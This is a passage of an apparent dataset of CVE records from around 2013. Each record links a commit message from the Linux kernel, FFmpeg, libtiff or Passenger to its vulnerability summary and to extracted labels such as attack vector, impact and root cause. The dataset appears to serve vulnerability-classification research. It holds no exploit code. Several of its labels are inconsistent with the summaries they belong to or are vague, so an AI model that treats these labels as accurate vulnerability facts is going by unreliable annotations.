<adobriyan@gmail.com>\nSigned-off-by: Daniel Borkmann <dborkman@redhat.com>\nCc: Steffen Klassert <steffen.klassert@secunet.com>\nCc: Hannes Frederic Sowa <hannes@stressinduktion.org>\nAcked-by: Vlad Yasevich <vyasevich@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The IPv6 SCTP implementation in net\/sctp\/ipv6.c in the Linux kernel through 3.11.1 uses data structures and function calls that do not trigger an intended configuration of IPsec encryption, which allows remote attackers to obtain sensitive information by sniffing the network.","commit_message_1":"sctp : fix ipv6 ipsec encryption bug in sctp_v6_xmit alan chester reported an issue with ipv6 on sctp that ipsec traffic is not being encrypted , whereas on ipv4 it is","Vulnerability Type":"Cryptographic Issues","Attack Vector":"by sniffing the network .","Impact":"obtain sensitive information","Root Cause":"uses data structures and function calls that do not trigger an intended configuration of ipsec encryption ,","Attack Type":"remote attacker"},{"commit_id":"d661684cf6820331feae71146c35da83d794467e","cve_id":"CVE-2013-4300","cwe_id":"CWE-264","commit_message":"net: Check the correct namespace when spoofing pid over SCM_RIGHTS\n\nThis is a security bug.\n\nThe follow-up will fix nsproxy to discourage this type of issue from\nhappening again.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nReviewed-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The scm_check_creds function in net\/core\/scm.c in the Linux kernel before 3.11 performs a capability check in an incorrect namespace, which allows local users to gain privileges via PID spoofing.","commit_message_1":"check the correct namespace when spoofing pid over scm_rights this is a security bug","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via pid spoofing","Impact":"gain privileges","Root Cause":"performs a capability check","Attack Type":"local attacker"},{"commit_id":"e9c6a182649f4259db704ae15a91ac820e63b0ca","cve_id":"CVE-2013-4299","cwe_id":"CWE-264","commit_message":"dm snapshot: fix data corruption\n\nThis patch fixes a particular type of data corruption that has been\nencountered when loading a snapshot's metadata from disk.\n\nWhen we allocate a new chunk in persistent_prepare, we increment\nps->next_free and we make sure that it doesn't point to a metadata area\nby further incrementing it if necessary.\n\nWhen we load metadata from disk on device activation, ps->next_free is\npositioned after the last used data chunk. However, if this last used\ndata chunk is followed by a metadata area, ps->next_free is positioned\nerroneously to the metadata area. A newly-allocated chunk is placed at\nthe same location as the metadata area, resulting in data or metadata\ncorruption.\n\nThis patch changes the code so that ps->next_free skips the metadata\narea when metadata are loaded in function read_exceptions.\n\nThe patch also moves a piece of code from persistent_prepare_exception\nto a separate function skip_metadata to avoid code duplication.\n\nCVE-2013-4299\n\nSigned-off-by: Mikulas Patocka <mpatocka@redhat.com>\nCc: stable@vger.kernel.org\nCc: Mike Snitzer <snitzer@redhat.com>\nSigned-off-by: Alasdair G Kergon <agk@redhat.com>","summary":"Interpretation conflict in drivers\/md\/dm-snap-persistent.c in the Linux kernel through 3.11.6 allows remote authenticated users to obtain sensitive information or modify data via a crafted mapping to a snapshot block device.","commit_message_1":"fix data corruption this patch fix a particular type of data corruption that ha been encountered when loading a snapshot 's metadata from disk","Vulnerability Type":"interpretation conflict","Attack Vector":"via a crafted mapping to a snapshot block device","Impact":"obtain sensitive information or modify data","Root Cause":"caused by an error when data is written to snapshot block devices","Attack Type":"remote attacker"},{"commit_id":"2433c8f094a008895e66f25bd1773cdb01c91d01","cve_id":"CVE-2013-4270","cwe_id":"CWE-20","commit_message":"net: Update the sysctl permissions handler to test effective uid\/gid\n\nModify the code to use current_euid(), and in_egroup_p, as in done\nin fs\/proc\/proc_sysctl.c:test_perm()\n\nCc: stable@vger.kernel.org\nReviewed-by: Eric Sandeen <sandeen@redhat.com>\nReported-by: Eric Sandeen <sandeen@redhat.com>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The net_ctl_permissions function in net\/sysctl_net.c in the Linux kernel before 3.11.5 does not properly determine uid and gid values, which allows local users to bypass intended \/proc\/sys\/net restrictions via a crafted application.","commit_message_1":"update the sysctl permission handler to test effective uid\/gid modify the code to use current_euid ( ) , and in_egroup_p , a in done in fs\/proc\/<file> : test_perm ( )","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted application","Impact":"bypass intended \/ proc \/ sys \/ net restrictions","Root Cause":"does not properly determine uid and gid values","Attack Type":"local attacker"},{"commit_id":"c94f9e854228e0ea00e1de8769d8d3f7cab84a55","cve_id":"CVE-2013-4265","cwe_id":null,"commit_message":"avutil\/mem: Fix flipped condition\n\nFixes return code and later null pointer dereference\n\nFound-by: Laurent Butti <laurentb@gmail.com>\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The av_reallocp_array function in libavutil\/mem.c in FFmpeg before 2.0.1 has an unspecified impact and remote vectors related to a *wrong return code* and a resultant NULL pointer dereference.","commit_message_1":"fix flipped condition fix return code and later null pointer dereference","Vulnerability Type":"NULL pointer dereference","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service","Root Cause":"has an unspecified impact and remote vectors related to a * wrong return code * and a resultant pointer dereference","Attack Type":"local attacker"},{"commit_id":"2960576378d17d71cc8dccc926352ce568b5eec1","cve_id":"CVE-2013-4264","cwe_id":"CWE-119","commit_message":"avcodec\/g2meet: fix src pointer checks in kempf_decode_tile()\n\nFixes Ticket2842\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The kempf_decode_tile function in libavcodec\/g2meet.c in FFmpeg before 2.0.1 allows remote attackers to cause a denial of service (out-of-bounds heap write) via a G2M4 encoded file.","commit_message_1":"avcodec\/g2meet : fix src pointer check in kempf_decode_tile ( )","Vulnerability Type":"buffer overflow","Attack Vector":"via a g2m4 encoded file","Impact":"cause a denial of service ( out - of - bounds heap write )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"e43a0a232dbf6d3c161823c2e07c52e76227a1bc","cve_id":"CVE-2013-4263","cwe_id":"CWE-119","commit_message":"avfilter: fix plane validity checks\n\nFixes out of array accesses\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"libavfilter in FFmpeg before 2.0.1 has unspecified impact and remote vectors related to a crafted *plane,* which triggers an out-of-bounds heap write.","commit_message_1":"fix plane validity check fix out of array access","Vulnerability Type":"buffer overflow","Attack Vector":"has unspecified remote vectors","Impact":"cause a denial of service","Root Cause":"a crafted * plane , * which triggers an out - of - bounds heap write","Attack Type":"remote attacker"},{"commit_id":"c95eb3184ea1a3a2551df57190c81da695e2144b","cve_id":"CVE-2013-4254","cwe_id":"CWE-20","commit_message":"ARM: 7809\/1: perf: fix event validation for software group leaders\n\nIt is possible to construct an event group with a software event as a\ngroup leader and then subsequently add a hardware event to the group.\nThis results in the event group being validated by adding all members\nof the group to a fake PMU and attempting to allocate each event on\ntheir respective PMU.\n\nUnfortunately, for software events wthout a corresponding arm_pmu, this\nresults in a kernel crash attempting to dereference the ->get_event_idx\nfunction pointer.\n\nThis patch fixes the problem by checking explicitly for software events\nand ignoring those in event validation (since they can always be\nscheduled). We will probably want to revisit this for 3.12, since the\nvalidation checks don't appear to work correctly when dealing with\nmultiple hardware PMUs anyway.\n\nCc: <stable@vger.kernel.org>\nReported-by: Vince Weaver <vincent.weaver@maine.edu>\nTested-by: Vince Weaver <vincent.weaver@maine.edu>\nTested-by: Mark Rutland <mark.rutland@arm.com>\nSigned-off-by: Will Deacon <will.deacon@arm.com>\nSigned-off-by: Russell King <rmk+kernel@arm.linux.org.uk>","summary":"The validate_event function in arch\/arm\/kernel\/perf_event.c in the Linux kernel before 3.10.8 on the ARM platform allows local users to gain privileges or cause a denial of service (NULL pointer dereference and system crash) by adding a hardware event to an event group led by a software event.","commit_message_1":"<number>\/<number> : perf : fix event validation for software group leader it is possible to construct an event group with a software event a a group leader and then subsequently add a hardware event to the group","Vulnerability Type":"Improper Input Validation","Attack Vector":"by adding a hardware event to an event group led by a software event","Impact":"gain privileges or cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"1fc29bacedeabb278080e31bb9c1ecb49f143c3b","cve_id":"CVE-2013-4247","cwe_id":"CWE-189","commit_message":"cifs: fix off-by-one bug in build_unc_path_to_root\n\ncommit 839db3d10a (cifs: fix up handling of prefixpath= option) changed\nthe code such that the vol->prepath no longer contained a leading\ndelimiter and then fixed up the places that accessed that field to\naccount for that change.\n\nOne spot in build_unc_path_to_root was missed however. When doing the\npointer addition on pos, that patch failed to account for the fact that\nwe had already incremented \"pos\" by one when adding the length of the\nprepath. This caused a buffer overrun by one byte.\n\nThis patch fixes the problem by correcting the handling of \"pos\".\n\nCc: <stable@vger.kernel.org> # v3.8+\nReported-by: Marcus Moeller <marcus.moeller@gmx.ch>\nReported-by: Ken Fallon <ken.fallon@gmail.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>","summary":"Off-by-one error in the build_unc_path_to_root function in fs\/cifs\/connect.c in the Linux kernel before 3.9.6 allows remote attackers to cause a denial of service (memory corruption and system crash) via a DFS share mount operation that triggers use of an unexpected DFS referral name length.","commit_message_1":"fix off-by-one bug in build_unc_path_to_root commit 839db3d10a ( cifs : fix up handling of prefixpath= option ) changed the code such that the vol- > prepath no longer contained a leading delimiter and then fixed up the place that accessed that field to account for that change","Vulnerability Type":"Numeric Errors","Attack Vector":"via a dfs share mount operation that triggers use of an unexpected dfs referral name length","Impact":"cause a denial of service ( memory corruption and system crash )","Root Cause":"caused by an off-by-one error","Attack Type":"attacker"},{"commit_id":"ce6841d9e41d621ba23cf18b190ee6a23b2cc833","cve_id":"CVE-2013-4244","cwe_id":"CWE-119","commit_message":"fix possible OOB write in gif2tiff.c","summary":"The LZW decompressor in the gif2tiff tool in libtiff 4.0.3 and earlier allows context-dependent attackers to cause a denial of service (out-of-bounds write and crash) or possibly execute arbitrary code via a crafted GIF image.","commit_message_1":"fix possible oob write in <file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted gif image","Impact":"cause a denial of service ( out - of - bounds write and crash ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by the LZW decompressor when performing conversion of GIF to TIFF image format","Attack Type":"remote attacker"},{"commit_id":"9955ac47f4ba1c95ecb6092aeaefb40a22e99268","cve_id":"CVE-2013-4220","cwe_id":null,"commit_message":"arm64: don't kill the kernel on a bad esr from el0\n\nRather than completely killing the kernel if we receive an esr value we\ncan't deal with in the el0 handlers, send the process a SIGILL and log\nthe esr value in the hope that we can debug it. If we receive a bad esr\nfrom el1, we'll die() as before.\n\nSigned-off-by: Mark Rutland <mark.rutland@arm.com>\nSigned-off-by: Catalin Marinas <catalin.marinas@arm.com>\nCc: stable@vger.kernel.org","summary":"The bad_mode function in arch\/arm64\/kernel\/traps.c in the Linux kernel before 3.9.5 on the ARM64 platform allows local users to cause a denial of service (system crash) via vectors involving an attempted register access that triggers an unexpected value in the Exception Syndrome Register (ESR).","commit_message_1":"do n't kill the kernel on a bad esr from el0 rather than completely killing the kernel if we receive an esr value we ca n't deal with in the el0 handler , send the process a sigill and log the esr value in the hope that we can debug it","Vulnerability Type":"system crash","Attack Vector":"via vectors involving an attempted register access that triggers an unexpected value in the exception syndrome register ( esr )","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by an error when generating trap\/esr","Attack Type":"local attacker"},{"commit_id":"6160968cee8b90a5dd95318d716e31d7775c4ef3","cve_id":"CVE-2013-4205","cwe_id":"CWE-399","commit_message":"userns: unshare_userns(&cred) should not populate cred on failure\n\nunshare_userns(new_cred) does *new_cred = prepare_creds() before\ncreate_user_ns() which can fail. However, the caller expects that\nit doesn't need to take care of new_cred if unshare_userns() fails.\n\nWe could change the single caller, sys_unshare(), but I think it\nwould be more clean to avoid the side effects on failure, so with\nthis patch unshare_userns() does put_cred() itself and initializes\n*new_cred only if create_user_ns() succeeeds.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Oleg Nesterov <oleg@redhat.com>\nReviewed-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Memory leak in the unshare_userns function in kernel\/user_namespace.c in the Linux kernel before 3.10.6 allows local users to cause a denial of service (memory consumption) via an invalid CLONE_NEWUSER unshare call.","commit_message_1":"unshare_userns ( & cred ) should not populate cred on failure unshare_userns ( new_cred ) doe * new_cred = prepare_creds ( ) before create_user_ns ( ) which can fail","Vulnerability Type":"Resource Management Errors","Attack Vector":"via an invalid clone _ newuser unshare call ","Impact":"cause a denial of service ( memory consumption )","Root Cause":"If User Namespace is enabled","Attack Type":"local attacker"},{"commit_id":"75a493e60ac4bbe2e977e7129d6d8cbb0dd236be","cve_id":"CVE-2013-4163","cwe_id":"CWE-399","commit_message":"ipv6: ip6_append_data_mtu did not care about pmtudisc and frag_size\n\nIf the socket had an IPV6_MTU value set, ip6_append_data_mtu lost track\nof this when appending the second frame on a corked socket. This results\nin the following splat:\n\n[37598.993962] ------------[ cut here ]------------\n[37598.994008] kernel BUG at net\/core\/skbuff.c:2064!\n[37598.994008] invalid opcode: 0000 [#1] SMP\n[37598.994008] Modules linked in: tcp_lp uvcvideo videobuf2_vmalloc videobuf2_memops videobuf2_core videodev media vfat fat usb_storage fuse ebtable_nat xt_CHECKSUM bridge stp llc ipt_MASQUERADE nf_conntrack_netbios_ns nf_conntrack_broadcast ip6table_mangle ip6t_REJECT nf_conntrack_ipv6 nf_defrag_ipv6 iptable_nat\n+nf_nat_ipv4 nf_nat iptable_mangle nf_conntrack_ipv4 nf_defrag_ipv4 xt_conntrack nf_conntrack ebtable_filter ebtables ip6table_filter ip6_tables be2iscsi iscsi_boot_sysfs bnx2i cnic uio cxgb4i cxgb4 cxgb3i cxgb3 mdio libcxgbi ib_iser rdma_cm ib_addr iw_cm ib_cm ib_sa ib_mad ib_core iscsi_tcp libiscsi_tcp libiscsi\n+scsi_transport_iscsi rfcomm bnep iTCO_wdt iTCO_vendor_support snd_hda_codec_conexant arc4 iwldvm mac80211 snd_hda_intel acpi_cpufreq mperf coretemp snd_hda_codec microcode cdc_wdm cdc_acm\n[37598.994008]  snd_hwdep cdc_ether snd_seq snd_seq_device usbnet mii joydev btusb snd_pcm bluetooth i2c_i801 e1000e lpc_ich mfd_core ptp iwlwifi pps_core snd_page_alloc mei cfg80211 snd_timer thinkpad_acpi snd tpm_tis soundcore rfkill tpm tpm_bios vhost_net tun macvtap macvlan kvm_intel kvm uinput binfmt_misc\n+dm_crypt i915 i2c_algo_bit drm_kms_helper drm i2c_core wmi video\n[37598.994008] CPU 0\n[37598.994008] Pid: 27320, comm: t2 Not tainted 3.9.6-200.fc18.x86_64 #1 LENOVO 27744PG\/27744PG\n[37598.994008] RIP: 0010:[<ffffffff815443a5>]  [<ffffffff815443a5>] skb_copy_and_csum_bits+0x325\/0x330\n[37598.994008] RSP: 0018:ffff88003670da18  EFLAGS: 00010202\n[37598.994008] RAX: ffff88018105c018 RBX: 0000000000000004 RCX: 00000000000006c0\n[37598.994008] RDX: ffff88018105a6c0 RSI: ffff88018105a000 RDI: ffff8801e1b0aa00\n[37598.994008] RBP: ffff88003670da78 R08: 0000000000000000 R09: ffff88018105c040\n[37598.994008] R10: ffff8801e1b0aa00 R11: 0000000000000000 R12: 000000000000fff8\n[37598.994008] R13: 00000000000004fc R14: 00000000ffff0504 R15: 0000000000000000\n[37598.994008] FS:  00007f28eea59740(0000) GS:ffff88023bc00000(0000) knlGS:0000000000000000\n[37598.994008] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b\n[37598.994008] CR2: 0000003d935789e0 CR3: 00000000365cb000 CR4: 00000000000407f0\n[37598.994008] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\n[37598.994008] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400\n[37598.994008] Process t2 (pid: 27320, threadinfo ffff88003670c000, task ffff88022c162ee0)\n[37598.994008] Stack:\n[37598.994008]  ffff88022e098a00 ffff88020f973fc0 0000000000000008 00000000000004c8\n[37598.994008]  ffff88020f973fc0 00000000000004c4 ffff88003670da78 ffff8801e1b0a200\n[37598.994008]  0000000000000018 00000000000004c8 ffff88020f973fc0 00000000000004c4\n[37598.994008] Call Trace:\n[37598.994008]  [<ffffffff815fc21f>] ip6_append_data+0xccf\/0xfe0\n[37598.994008]  [<ffffffff8158d9f0>] ? ip_copy_metadata+0x1a0\/0x1a0\n[37598.994008]  [<ffffffff81661f66>] ? _raw_spin_lock_bh+0x16\/0x40\n[37598.994008]  [<ffffffff8161548d>] udpv6_sendmsg+0x1ed\/0xc10\n[37598.994008]  [<ffffffff812a2845>] ? sock_has_perm+0x75\/0x90\n[37598.994008]  [<ffffffff815c3693>] inet_sendmsg+0x63\/0xb0\n[37598.994008]  [<ffffffff812a2973>] ? selinux_socket_sendmsg+0x23\/0x30\n[37598.994008]  [<ffffffff8153a450>] sock_sendmsg+0xb0\/0xe0\n[37598.994008]  [<ffffffff810135d1>] ? __switch_to+0x181\/0x4a0\n[37598.994008]  [<ffffffff8153d97d>] sys_sendto+0x12d\/0x180\n[37598.994008]  [<ffffffff810dfb64>] ? __audit_syscall_entry+0x94\/0xf0\n[37598.994008]  [<ffffffff81020ed1>] ? syscall_trace_enter+0x231\/0x240\n[37598.994008]  [<ffffffff8166a7e7>] tracesys+0xdd\/0xe2\n[37598.994008] Code: fe 07 00 00 48 c7 c7 04 28 a6 81 89 45 a0 4c 89 4d b8 44 89 5d a8 e8 1b ac b1 ff 44 8b 5d a8 4c 8b 4d b8 8b 45 a0 e9 cf fe ff ff <0f> 0b 66 0f 1f 84 00 00 00 00 00 66 66 66 66 90 55 48 89 e5 48\n[37598.994008] RIP  [<ffffffff815443a5>] skb_copy_and_csum_bits+0x325\/0x330\n[37598.994008]  RSP <ffff88003670da18>\n[37599.007323] ---[ end trace d69f6a17f8ac8eee ]---\n\nWhile there, also check if path mtu discovery is activated for this\nsocket. The logic was adapted from ip6_append_data when first writing\non the corked socket.\n\nThis bug was introduced with commit\n0c1833797a5a6ec23ea9261d979aa18078720b74 (\"ipv6: fix incorrect ipsec\nfragment\").\n\nv2:\na) Replace IPV6_PMTU_DISC_DO with IPV6_PMTUDISC_PROBE.\nb) Don't pass ipv6_pinfo to ip6_append_data_mtu (suggestion by Gao\n   feng, thanks!).\nc) Change mtu to unsigned int, else we get a warning about\n   non-matching types because of the min()-macro type-check.\n\nAcked-by: Gao feng <gaofeng@cn.fujitsu.com>\nCc: YOSHIFUJI Hideaki <yoshfuji@linux-ipv6.org>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ip6_append_data_mtu function in net\/ipv6\/ip6_output.c in the IPv6 implementation in the Linux kernel through 3.10.3 does not properly maintain information about whether the IPV6_MTU setsockopt option had been specified, which allows local users to cause a denial of service (BUG and system crash) via a crafted application that uses the UDP_CORK option in a setsockopt system call.","commit_message_1":"ip6_append_data_mtu did not care about pmtudisc and frag_size if the socket had an ipv6_mtu value set , ip6_append_data_mtu lost track of this when appending the second frame on a corked socket","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted application that uses the udp _ cork option in a setsockopt system call","Impact":"cause a denial of service ( bug and system crash )","Root Cause":"does not properly maintain information about whether the ipv6 _ mtu setsockopt option had been specified","Attack Type":"local attacker"},{"commit_id":"8822b64a0fa64a5dd1dfcf837c5b0be83f8c05d1","cve_id":"CVE-2013-4162","cwe_id":"CWE-399","commit_message":"ipv6: call udp_push_pending_frames when uncorking a socket with AF_INET pending data\n\nWe accidentally call down to ip6_push_pending_frames when uncorking\npending AF_INET data on a ipv6 socket. This results in the following\nsplat (from Dave Jones):\n\nskbuff: skb_under_panic: text:ffffffff816765f6 len:48 put:40 head:ffff88013deb6df0 data:ffff88013deb6dec tail:0x2c end:0xc0 dev:<NULL>\n------------[ cut here ]------------\nkernel BUG at net\/core\/skbuff.c:126!\ninvalid opcode: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC\nModules linked in: dccp_ipv4 dccp 8021q garp bridge stp dlci mpoa snd_seq_dummy sctp fuse hidp tun bnep nfnetlink scsi_transport_iscsi rfcomm can_raw can_bcm af_802154 appletalk caif_socket can caif ipt_ULOG x25 rose af_key pppoe pppox ipx phonet irda llc2 ppp_generic slhc p8023 psnap p8022 llc crc_ccitt atm bluetooth\n+netrom ax25 nfc rfkill rds af_rxrpc coretemp hwmon kvm_intel kvm crc32c_intel snd_hda_codec_realtek ghash_clmulni_intel microcode pcspkr snd_hda_codec_hdmi snd_hda_intel snd_hda_codec snd_hwdep usb_debug snd_seq snd_seq_device snd_pcm e1000e snd_page_alloc snd_timer ptp snd pps_core soundcore xfs libcrc32c\nCPU: 2 PID: 8095 Comm: trinity-child2 Not tainted 3.10.0-rc7+ #37\ntask: ffff8801f52c2520 ti: ffff8801e6430000 task.ti: ffff8801e6430000\nRIP: 0010:[<ffffffff816e759c>]  [<ffffffff816e759c>] skb_panic+0x63\/0x65\nRSP: 0018:ffff8801e6431de8  EFLAGS: 00010282\nRAX: 0000000000000086 RBX: ffff8802353d3cc0 RCX: 0000000000000006\nRDX: 0000000000003b90 RSI: ffff8801f52c2ca0 RDI: ffff8801f52c2520\nRBP: ffff8801e6431e08 R08: 0000000000000000 R09: 0000000000000000\nR10: 0000000000000001 R11: 0000000000000001 R12: ffff88022ea0c800\nR13: ffff88022ea0cdf8 R14: ffff8802353ecb40 R15: ffffffff81cc7800\nFS:  00007f5720a10740(0000) GS:ffff880244c00000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 0000000005862000 CR3: 000000022843c000 CR4: 00000000001407e0\nDR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\nDR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000600\nStack:\n ffff88013deb6dec 000000000000002c 00000000000000c0 ffffffff81a3f6e4\n ffff8801e6431e18 ffffffff8159a9aa ffff8801e6431e90 ffffffff816765f6\n ffffffff810b756b 0000000700000002 ffff8801e6431e40 0000fea9292aa8c0\nCall Trace:\n [<ffffffff8159a9aa>] skb_push+0x3a\/0x40\n [<ffffffff816765f6>] ip6_push_pending_frames+0x1f6\/0x4d0\n [<ffffffff810b756b>] ? mark_held_locks+0xbb\/0x140\n [<ffffffff81694919>] udp_v6_push_pending_frames+0x2b9\/0x3d0\n [<ffffffff81694660>] ? udplite_getfrag+0x20\/0x20\n [<ffffffff8162092a>] udp_lib_setsockopt+0x1aa\/0x1f0\n [<ffffffff811cc5e7>] ? fget_light+0x387\/0x4f0\n [<ffffffff816958a4>] udpv6_setsockopt+0x34\/0x40\n [<ffffffff815949f4>] sock_common_setsockopt+0x14\/0x20\n [<ffffffff81593c31>] SyS_setsockopt+0x71\/0xd0\n [<ffffffff816f5d54>] tracesys+0xdd\/0xe2\nCode: 00 00 48 89 44 24 10 8b 87 d8 00 00 00 48 89 44 24 08 48 8b 87 e8 00 00 00 48 c7 c7 c0 04 aa 81 48 89 04 24 31 c0 e8 e1 7e ff ff <0f> 0b 55 48 89 e5 0f 0b 55 48 89 e5 0f 0b 55 48 89 e5 0f 0b 55\nRIP  [<ffffffff816e759c>] skb_panic+0x63\/0x65\n RSP <ffff8801e6431de8>\n\nThis patch adds a check if the pending data is of address family AF_INET\nand directly calls udp_push_ending_frames from udp_v6_push_pending_frames\nif that is the case.\n\nThis bug was found by Dave Jones with trinity.\n\n(Also move the initialization of fl6 below the AF_INET check, even if\nnot strictly necessary.)\n\nCc: Dave Jones <davej@redhat.com>\nCc: YOSHIFUJI Hideaki <yoshfuji@linux-ipv6.org>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The udp_v6_push_pending_frames function in net\/ipv6\/udp.c in the IPv6 implementation in the Linux kernel through 3.10.3 makes an incorrect function call for pending data, which allows local users to cause a denial of service (BUG and system crash) via a crafted application that uses the UDP_CORK option in a setsockopt system call.","commit_message_1":"call udp_push_pending_frames when uncorking a socket with af_inet pending data we accidentally call down to ip6_push_pending_frames when uncorking pending af_inet data on a ipv6 socket","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted application that uses the udp _ cork option in a setsockopt system call","Impact":"cause a denial of service ( bug and system crash )","Root Cause":"makes an incorrect function call for pending data","Attack Type":"local attacker"},{"commit_id":"5483b3292cc2af1c83033eaaadec20dba4dcfd9b","cve_id":"CVE-2013-4136","cwe_id":"CWE-59","commit_message":"If the server instance directory already exists, it is now removed first in order get correct directory permissions.\nIf the directory still exists after removal, Phusion Passenger aborts to avoid writing to a directory with unexpected permissions.\nFixes issue #910.","summary":"ext\/common\/ServerInstanceDir.h in Phusion Passenger gem before 4.0.6 for Ruby allows local users to gain privileges or possibly change the ownership of arbitrary directories via a symlink attack on a directory with a predictable name in \/tmp\/.","commit_message_1":"if the server instance directory already exists , it is now removed first in order get correct directory permission","Vulnerability Type":"Link Following","Attack Vector":"via a symlink attack on a directory with a predictable name in \/ tmp \/","Impact":"gain privileges or possibly change the ownership of arbitrary directories","Root Cause":"by creating a symbolic link from Utils.cpp file to various files","Attack Type":"local attacker"},{"commit_id":"c7e8e8a8f7a70b343ca1e0f90a31e35ab2d16de1","cve_id":"CVE-2013-4129","cwe_id":"CWE-20","commit_message":"bridge: fix some kernel warning in multicast timer\n\nSeveral people reported the warning: \"kernel BUG at kernel\/timer.c:729!\"\nand the stack trace is:\n\n\t#7 [ffff880214d25c10] mod_timer+501 at ffffffff8106d905\n\t#8 [ffff880214d25c50] br_multicast_del_pg.isra.20+261 at ffffffffa0731d25 [bridge]\n\t#9 [ffff880214d25c80] br_multicast_disable_port+88 at ffffffffa0732948 [bridge]\n\t#10 [ffff880214d25cb0] br_stp_disable_port+154 at ffffffffa072bcca [bridge]\n\t#11 [ffff880214d25ce8] br_device_event+520 at ffffffffa072a4e8 [bridge]\n\t#12 [ffff880214d25d18] notifier_call_chain+76 at ffffffff8164aafc\n\t#13 [ffff880214d25d50] raw_notifier_call_chain+22 at ffffffff810858f6\n\t#14 [ffff880214d25d60] call_netdevice_notifiers+45 at ffffffff81536aad\n\t#15 [ffff880214d25d80] dev_close_many+183 at ffffffff81536d17\n\t#16 [ffff880214d25dc0] rollback_registered_many+168 at ffffffff81537f68\n\t#17 [ffff880214d25de8] rollback_registered+49 at ffffffff81538101\n\t#18 [ffff880214d25e10] unregister_netdevice_queue+72 at ffffffff815390d8\n\t#19 [ffff880214d25e30] __tun_detach+272 at ffffffffa074c2f0 [tun]\n\t#20 [ffff880214d25e88] tun_chr_close+45 at ffffffffa074c4bd [tun]\n\t#21 [ffff880214d25ea8] __fput+225 at ffffffff8119b1f1\n\t#22 [ffff880214d25ef0] ____fput+14 at ffffffff8119b3fe\n\t#23 [ffff880214d25f00] task_work_run+159 at ffffffff8107cf7f\n\t#24 [ffff880214d25f30] do_notify_resume+97 at ffffffff810139e1\n\t#25 [ffff880214d25f50] int_signal+18 at ffffffff8164f292\n\nthis is due to I forgot to check if mp->timer is armed in\nbr_multicast_del_pg(). This bug is introduced by\ncommit 9f00b2e7cf241fa389733d41b6 (bridge: only expire the mdb entry\nwhen query is received).\n\nSame for __br_mdb_del().\n\nTested-by: poma <pomidorabelisima@gmail.com>\nReported-by: LiYonghua <809674045@qq.com>\nReported-by: Robert Hancock <hancockrwd@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nCc: Stephen Hemminger <stephen@networkplumber.org>\nCc: \"David S. Miller\" <davem@davemloft.net>\nSigned-off-by: Cong Wang <amwang@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The bridge multicast implementation in the Linux kernel through 3.10.3 does not check whether a certain timer is armed before modifying the timeout value of that timer, which allows local users to cause a denial of service (BUG and system crash) via vectors involving the shutdown of a KVM virtual machine, related to net\/bridge\/br_mdb.c and net\/bridge\/br_multicast.c.","commit_message_1":"fix some kernel warning in multicast timer several people reported the warning : `` kernel bug at kernel\/<file> : <number> ! '' and the stack trace is : # <number> [ ffff880214d25c10 ] mod_timer+<number> at ffffffff8106d905 # <number> [ ffff880214d25c50 ] <file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via vectors involving the shutdown of a kvm virtual machine , related to net \/ bridge \/ br _ mdb . c and net \/ bridge \/ br _ multicast . c","Impact":"cause a denial of service ( bug and system crash )","Root Cause":"does not check whether a certain timer is armed before modifying the timeout value of that timer","Attack Type":"local attacker"},{"commit_id":"dd7633ecd553a5e304d349aa6f8eb8a0417098c5","cve_id":"CVE-2013-4127","cwe_id":"CWE-399","commit_message":"vhost-net: fix use-after-free in vhost_net_flush\n\nvhost_net_ubuf_put_and_wait has a confusing name:\nit will actually also free it's argument.\nThus since commit 1280c27f8e29acf4af2da914e80ec27c3dbd5c01\n    \"vhost-net: flush outstanding DMAs on memory change\"\nvhost_net_flush tries to use the argument after passing it\nto vhost_net_ubuf_put_and_wait, this results\nin use after free.\nTo fix, don't free the argument in vhost_net_ubuf_put_and_wait,\nadd an new API for callers that want to free ubufs.\n\nAcked-by: Asias He <asias@redhat.com>\nAcked-by: Jason Wang <jasowang@redhat.com>\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Use-after-free vulnerability in the vhost_net_set_backend function in drivers\/vhost\/net.c in the Linux kernel through 3.10.3 allows local users to cause a denial of service (OOPS and system crash) via vectors involving powering on a virtual machine.","commit_message_1":"fix use-after-free in 